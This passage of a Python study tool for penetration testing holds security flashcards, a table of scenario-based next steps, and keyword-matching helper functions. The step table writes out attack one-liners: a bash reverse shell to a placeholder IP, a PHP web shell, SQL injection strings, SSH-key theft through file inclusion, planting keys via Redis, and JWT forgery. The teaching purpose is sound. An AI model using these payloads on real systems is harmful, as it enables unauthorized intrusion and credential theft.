A: Default credentials, unnecessary features enabled, verbose errors, outdated software""",

    "jwt": """Q: What are the three parts of a JWT?
A: Header (algorithm), Payload (claims), Signature (verification)

Q: What's the 'none' algorithm vulnerability?
A: Server accepts unsigned tokens if alg:none, allowing forgery

Q: What claim specifies JWT expiration?
A: exp (expiration time as Unix timestamp)""",

    "ssrf": """Q: What's the AWS metadata endpoint commonly targeted in SSRF?
A: http://169.254.169.254/latest/meta-data/

Q: Name two ways to bypass localhost blacklists in SSRF
A: Use 127.1, 0.0.0.0, [::1], or DNS rebinding

Q: What internal service might be exposed via SSRF on port 6379?
A: Redis (often no authentication required)""",

    "api security": """Q: What's the difference between OAuth 2.0 and OpenID Connect?
A: OAuth is authorization framework; OpenID Connect adds authentication layer on top

Q: What HTTP header commonly contains API keys?
A: Authorization (e.g., Bearer token) or custom headers like X-API-Key

Q: What's the principle of least privilege in API design?
A: Grant minimum permissions needed; revoke access when no longer required""",

    "forensics": """Q: What are magic bytes?
A: File signature at beginning (e.g., FF D8 FF for JPEG)

Q: What's the difference between file carving and file recovery?
A: Carving extracts based on signatures/structure; recovery uses filesystem metadata

Q: What does strings command do?
A: Extracts printable character sequences from binary files""",

    "steganography": """Q: What does LSB steganography mean?
A: Least Significant Bit - hiding data in lowest bits of pixel values

Q: What metadata might images contain?
A: EXIF data (camera, GPS, timestamps, software used)

Q: Name a tool for analyzing audio spectrograms
A: Audacity (View → Spectrogram)""",

    "cloud security": """Q: What's an AWS S3 bucket ACL misconfiguration?
A: Public read/write access allowing anyone to list/download/upload files

Q: What service provides temporary AWS credentials?
A: STS (Security Token Service) via IAM roles

Q: What's the shared responsibility model?
A: Cloud provider secures infrastructure; customer secures data and applications""",

    "active directory": """Q: What's Kerberoasting?
A: Requesting TGS tickets for accounts with SPNs, cracking tickets offline

Q: What tool maps AD attack paths?
A: BloodHound (visualizes relationships and privilege escalation paths)

Q: What's a Golden Ticket attack?
A: Forging Kerberos TGT with compromised krbtgt hash for domain persistence""",

    "docker": """Q: What's the risk of exposed Docker socket?
A: Container can control Docker daemon, create privileged containers, escape to host

Q: What does --privileged flag do?
A: Gives container all capabilities, access to devices, disables security features

Q: How to check if you're in a container?
A: Check /.dockerenv, examine /proc/1/cgroup, or look for Docker-related processes""",

    "reverse engineering": """Q: What's the difference between disassembly and decompilation?
A: Disassembly converts to assembly; decompilation attempts to recreate source code

Q: What packer/protector obfuscates malware?
A: UPX, Themida, VMProtect (compress and encrypt executables)

Q: What does 'strings' command help with in RE?
A: Quickly finds hardcoded strings (URLs, IPs, function names, error messages)""",

    "threat modeling": """Q: What does STRIDE stand for?
A: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege

Q: What's a zero-day vulnerability?
A: Vulnerability unknown to vendor/public, no patch available

Q: What's defense in depth?
A: Multiple layers of security controls (if one fails, others still protect)"""
}


# ============================================================================
# PLAN DATABASE - 35+ contextual scenarios
# ============================================================================

PLAN_DB: Dict[str, str] = {
    "found port 80 open": """1. Enumerate web service with nikto -h http://target or whatweb http://target
2. Check robots.txt, sitemap.xml, and common endpoints (/admin, /api, /.git)
3. Run directory brute-force with gobuster or ffuf using medium wordlist""",

    "found port 22 open": """1. Check SSH version with nc target 22 or nmap -sV
2. Test for weak credentials with hydra if authorized (small password list)
3. Look for SSH keys in other services or escalate from initial access""",

    "found port 3389 open": """1. Identify RDP version and potential vulnerabilities (BlueKeep if applicable)
2. Check for weak credentials with hydra/crowbar (carefully, avoid lockouts)
3. Consider RDP session hijacking if you gain initial access""",

    "found web server": """1. Identify technology stack with Wappalyzer or whatweb
2. Browse manually to understand functionality and user roles
3. Test for common vulnerabilities (SQLi in login, XSS in inputs, IDOR in APIs)""",

    "found login page": """1. Test for SQL injection: ' OR '1'='1'-- in username/password
2. Check for default credentials (admin/admin, admin/password)
3. Examine JavaScript for client-side validation bypasses or exposed endpoints""",

    "nmap found http": """1. Visit website in browser and explore manually first
2. Check for technology fingerprints and version info
3. Use gobuster dir to find hidden directories and files""",

    "got user shell": """1. Upgrade to stable TTY: python -c 'import pty;pty.spawn("/bin/bash")'
2. Enumerate system: sudo -l, find / -perm -4000, check cron jobs
3. Download and run linpeas.sh for comprehensive privilege escalation checks""",

    "found hash": """1. Identify hash type with hashid -m hash or hash-identifier
2. Choose appropriate cracking tool and mode (hashcat -m N, john --format=)
3. Start with common wordlist (rockyou.txt) and consider rules if needed""",

    "sql injection confirmed": """1. Determine database type and column count (UNION SELECT NULL,NULL,...)
2. Extract database names (UNION SELECT schema_name FROM information_schema.schemata)
3. Enumerate tables and columns, then extract sensitive data (users, passwords)""",

    "xss found": """1. Test payload variation to bypass filters (event handlers, encoding, attribute injection)
2. Verify impact: Can you steal cookies? (document.cookie)
3. Craft POC for report and consider impact (stored vs reflected, who can trigger)""",

    "subdomain enumeration": """1. Passive: Check crt.sh for certificate transparency logs
2. Active: Brute-force with sublist3r, amass, or ffuf with subdomain wordlist
3. Check for subdomain takeover vulnerabilities on discovered subdomains""",

    "found api endpoint": """1. Test without authentication first (check response codes and errors)
2. Examine for IDOR by changing ID parameters (user_id, doc_id, etc.)
3. Test for mass assignment by adding extra JSON parameters""",

    "file upload found": """1. Test for extension bypasses (.php.jpg, .php5, .phtml)
2. Check if you can upload web shell (simple PHP: <?php system($_GET['cmd']); ?>)
3. Verify file location (view source, check responses) and access uploaded file""",

    "command injection suspected": """1. Test with basic payloads: ; id, && whoami, | ls, `whoami`
2. If blind, try time-based: ; sleep 5 (observe response delay)
3. Once confirmed, establish reverse shell: ; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1""",

    "found credentials": """1. Test credentials on all discovered services (SSH, RDP, web portals, databases)
2. Try credential stuffing with variations (same password, different users)
3. Document where found and check for password reuse patterns""",

    "found wordpress": """1. Enumerate users: wpscan --url target --enumerate u
2. Enumerate plugins: wpscan --url target --enumerate p
3. Check for vulnerable plugins and default admin credentials""",

    "directory traversal found": """1. Test depth: ../../../etc/passwd, try various depths (../../, ../../../../)
2. Try PHP filters for source code: php://filter/convert.base64-encode/resource=index.php
3. Enumerate interesting files: config files, logs, SSH keys (/home/user/.ssh/id_rsa)""",

    "got database access": """1. Enumerate: SELECT schema_name FROM information_schema.schemata; (list databases)
2. Find sensitive tables: SELECT table_name FROM information_schema.tables;
3. Check for admin users, password hashes, API keys, and high-value data""",

    "found .git exposed": """1. Use git-dumper to extract repository: git-dumper http://target/.git/ output/
2. Examine commit history: git log --all (look for removed secrets)
3. Search for credentials: git grep -i password, git grep -i api_key""",

    "found admin panel": """1. Test default credentials (admin/admin, administrator/password)
2. Check for authentication bypass (SQL injection in login)
3. Look for file upload, backup/restore, or code execution features""",

    "lfi confirmed": """1. Test for code execution via log poisoning (inject PHP into User-Agent, include log)
2. Check for PHP wrappers: php://input with POST data containing PHP code
3. Enumerate for SSH keys: ?file=../../../../home/username/.ssh/id_rsa""",

    "found redis open": """1. Check if authentication required: redis-cli -h target
2. If no auth, enumerate keys: KEYS *
3. Try writing SSH key: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys""",

    "found smb shares": """1. List shares: smbclient -L //target -N (try null session)
2. Enumerate permissions: smbmap -H target -u guest
3. Access interesting shares and look for credentials, configs, sensitive files""",

    "found ldap": """1. Try anonymous bind: ldapsearch -x -H ldap://target -b "dc=domain,dc=com"
2. Enumerate users and groups
3. Look for service accounts with passwords in description field""",

    "privilege escalation needed": """1. Run automated: linpeas.sh or winPEAS.exe
2. Check sudo -l, SUID binaries, writable files in PATH
3. Review cronjobs, systemd timers, and scheduled tasks""",

    "found jwt token": """1. Decode at jwt.io to see claims (user_id, role, exp)
2. Test algorithm confusion: change RS256 to HS256, use public key as secret
3. Test for 'none' algorithm acceptance (remove signature)""",

    "windows initial access": """1. Enumerate with winPEAS.exe or PowerUp.ps1
2. Check whoami /priv for exploitable privileges (SeImpersonate → Juicy Potato)
3. Look for unquoted service paths, weak service permissions""",

    "aws environment": """1. Check for metadata endpoint: curl http://169.254.169.254/latest/meta-data/
2. Enumerate S3 buckets: aws s3 ls (if credentials available)
3. Check IAM permissions: aws sts get-caller-identity""",

    "reverse shell received": """1. Stabilize shell: python -c 'import pty;pty.spawn("/bin/bash")'
2. Background (Ctrl+Z), run: stty raw -echo; fg, then: export TERM=xterm
3. Begin enumeration: whoami, id, uname -a, ip addr""",

    "found serialized data": """1. Identify serialization format (PHP, Python pickle, Java)
2. Test for deserialization vulnerabilities with ysoserial or similar
3. Craft malicious object for RCE""",

    "docker container access": """1. Check for privileged mode: capsh --print, check /dev
2. Look for exposed Docker socket: ls -la /var/run/docker.sock
3. Check for mounted host filesystem: df -h, mount""",

    "found ssrf": """1. Test metadata endpoint: http://169.254.169.254/latest/meta-data/
2. Port scan internal network: http://192.168.1.X:PORT
3. Try file:// protocol for local file read""",

    "csrf found": """1. Create POC: Auto-submitting form with victim's target action
2. Test token: Remove it, use another session's token, modify value
3. Check if referer/origin validation can be bypassed""",

    "found race condition": """1. Identify timing window (between check and action)
2. Use Burp Repeater to send multiple requests in parallel
3. Exploit: Redeem voucher multiple times, withdraw same funds repeatedly""",

    "mobile app testing": """1. Decompile APK with apktool or use jadx for Java source
2. Check for hardcoded credentials, API keys in strings.xml and code
3. Proxy traffic through Burp (install Burp CA cert on device)"""
}


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def find_best_match(query: str, database: Dict[str, any]) -> Tuple[str, float]:
    """
    Find best matching entry in database based on keyword overlap.
    Returns (key, score) where score is percentage of query words found.
    """
    query_lower = query.lower()
    query_words = set(query_lower.split())

    best_key = None
    best_score = 0.0

    for key in database:
        key_words = set(key.lower().split())
        # Check how many query words appear in the key
        matches = sum(1 for word in query_words if any(word in key_word for key_word in key_words))
        score = matches / len(query_words) if query_words else 0

        # Also check if full key appears in query
        if key.lower() in query_lower:
            score += 0.5

        if score > best_score:
            best_score = score
            best_key = key

    return best_key, best_score


def smart_explain(command: str) -> str:
    """Enhanced explain with comprehensive command database."""
    cmd = command.strip().lower()

    # Extract base command
    base_cmd = cmd.split()[0] if cmd else ""

    # Check for exact matches first
    if base_cmd in EXPLAIN_DB:
        entry = EXPLAIN_DB[base_cmd]
        parts = [entry["base"]]

        # Add flag-specific explanations
        for flag, desc in entry.items():
            if flag in ["base", "usage", "caution"]:
                continue
            if flag in cmd:
                parts.append(f"{flag}: {desc}")

        # Add usage and caution
        if "usage" in entry:
            parts.append(f"Use when: {entry['usage']}")
        if "caution" in entry:
            parts.append(f"⚠ {entry['caution']}")

        return "\n".join(parts)

    # Try partial matches
    for tool, entry in EXPLAIN_DB.items():
        if tool in cmd:
            parts = [entry["base"]]
            if "usage" in entry:
                parts.append(f"Use when: {entry['usage']}")
            if "caution" in entry:
                parts.append(f"⚠ {entry['caution']}")
            return "\n".join(parts)

    return "Command not in knowledge base. Try a simpler example or check man page."


def smart_tip(topic: str) -> str:
    """Enhanced tip with comprehensive topic database."""
    best_key, score = find_best_match(topic, TIP_DB)

    if best_key and score > 0.3:
        return TIP_DB[best_key]

    return "Topic not found. Try: sql injection, xss, privilege escalation, nmap, burp suite, password cracking, metasploit, api testing, cloud security"


def smart_assist(issue: str) -> str:
    """Enhanced assist with comprehensive error database."""
    best_key, score = find_best_match(issue, ASSIST_DB)

    if best_key and score > 0.3:
        return ASSIST_DB[best_key]

    return "Issue not recognized. Reproduce the error, capture the exact message, and try simplifying the command. Check tool documentation and logs for details."


def smart_report(finding: str) -> str:
    """Enhanced report with comprehensive vulnerability database."""
    best_key, score = find_best_match(finding, REPORT_DB)

    if best_key and score > 0.3:
        return REPORT_DB[best_key]

    # Fallback generic template
    return f"""Vulnerability: {finding if finding else '(describe vulnerability)'}
Impact: (what can attacker do? data access, privilege escalation, denial of service, etc.)
Mitigation: (specific steps to fix: input validation, access controls, patching, configuration changes)"""


def smart_quiz(topic: str) -> str:
    """Enhanced quiz with comprehensive flashcard database."""
    best_key, score = find_best_match(topic, QUIZ_DB)

    if best_key and score > 0.3:
        return QUIZ_DB[best_key]

    # Generic fallback
    return f"""Q: What is {topic}?
A: (core concept in one sentence)

Q: When is {topic} commonly found?
A: (typical scenarios or contexts)

Q: What's a key mitigation for {topic}?
A: (primary defensive measure)"""


def smart_plan(context: str) -> str:
    """Enhanced plan with comprehensive scenario database."""
    best_key, score = find_best_match(context, PLAN_DB)

    if best_key and score > 0.3:
        return PLAN_DB[best_key]

    # Fallback generic plan
    return """1. Clarify scope and objective (what are you trying to achieve?)
2. Choose appropriate tools with safe default settings
3. Document findings and plan next targeted probe based on results"""
